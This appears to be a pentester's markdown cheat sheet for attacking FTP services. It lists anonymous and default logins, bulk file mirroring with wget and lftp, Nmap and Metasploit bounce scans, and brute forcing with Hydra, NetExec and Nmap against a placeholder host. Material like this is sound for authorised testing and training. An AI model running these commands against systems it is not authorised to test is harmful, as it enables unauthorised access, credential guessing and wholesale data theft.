# Port 21 - FTP

## Table of Contents
- [Enumeration](#enumeration)
    - [Default Credential](#default-credential)
    - [Config Files](#config-file)
    - [Browser connect](#browser-connect)
    - [Nmap Scripts](#nmap-scripts)
    - [FTP Bounce Attack](#ftp-bounce-attack)
    - [Download All Files](#download-all-files)
- [Brute Force](#brute-force)

### Enumeration

```shell
ftp $rhost
>anonymous
>anonymous
>ls -a # List all files (even hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit
```

#### Default Credential

```shell
Default Credentials
anonymous : anonymous
_anonymous :
_ftp : ftp
```

#### Config File

```shell
ftpusers
ftp.conf
proftpd.conf
vsftpd.conf
```

- /etc/vsftpd.conf

    ```shell
    anonymous_enable=YES
    anon_upload_enable=YES
    anon_mkdir_write_enable=YES
    anon_root=/home/username/ftp - Directory for anonymous.
    chown_uploads=YES - Change ownership of anonymously uploaded files
    chown_username=username - User who is given ownership of anonymously uploaded files
    local_enable=YES - Enable local users to login
    no_anon_password=YES - Do not ask anonymous for password
    write_enable=YES - Allow commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE
    ```

#### Browser connect

```shell
ftp://anonymous:anonymous@$rhost
```

- Download files

    ```shell
    wget -m ftp://anonymous:anonymous@$rhost 
    ```

    ```shell
    wget -m --no-passive ftp://anonymous:anonymous@$rhost
    ```

### Nmap Scripts

```shell
# FTP server features
nmap -p 21 --script ftp-features $rhost

# FTP anonymous login
nmap -p 21 --script ftp-anon $rhost

# FTP brute force
nmap -p 21 --script ftp-brute $rhost
```

### FTP Bounce Attack

> Exploit FTP PORT command to scan other hosts

```shell
# Nmap FTP bounce scan
nmap -b <ftp_server>:<port> <target_network>

# Metasploit
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS <ftp_server>
run
```

### Download All Files

```shell
wget -m ftp://anonymous:anonymous@$rhost

# Using lftp
lftp $rhost
mirror /
```

---

### Brute force

#### NetExec

```shell
nxc ftp $rhost -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt --threads 10
```

#### Hydra

```shell
hydra -L users.txt -P passwords.txt -f ftp://$rhost
```

#### Nmap

```shell
nmap -p 21 --script ftp-brute $rhost
```